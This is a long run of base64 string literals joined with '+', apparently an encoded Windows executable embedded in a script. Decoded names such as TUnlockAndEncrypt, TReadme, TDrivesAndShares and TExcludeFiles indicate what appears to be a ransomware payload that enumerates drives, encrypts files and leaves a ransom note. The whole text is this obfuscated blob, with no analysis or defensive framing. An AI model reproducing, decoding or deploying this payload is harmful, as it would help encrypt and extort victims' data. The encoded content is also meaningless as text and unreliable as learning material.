'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' + 
